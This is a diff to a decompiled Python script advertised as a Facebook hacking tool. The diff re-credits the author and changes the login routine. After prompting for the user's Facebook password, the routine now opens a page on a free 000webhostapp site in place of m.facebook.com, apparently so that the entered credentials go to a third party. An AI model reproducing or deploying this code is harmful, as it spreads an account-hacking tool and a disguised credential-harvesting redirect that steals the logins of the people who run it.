@@ -1,4 +1,4 @@
-#Decompiled by Ahmadmtp
+#Decompiled by Mr.Clayz
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -23,7 +23,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = ' Tools Hack Facebook \n\x1b[1;93m Author    : Ahmadmtp \n\x1b[1;93m My Team.  : cyber noobz \n\x1b[1;93m Thanks To : Allah SWT'
+logo = ' Tools Hack Facebook \n\x1b[1;93m Author    : Mr.Clayz \n\x1b[1;93m My Team.  : cyber noobz \n\x1b[1;93m Thanks To : Allah SWT'
 def tik():
     titik = [
      '.   ', '..  ', '... ']
@@ -69,7 +69,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('https://spesial-untuk-kamu.000webhostapp.com/index.php')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
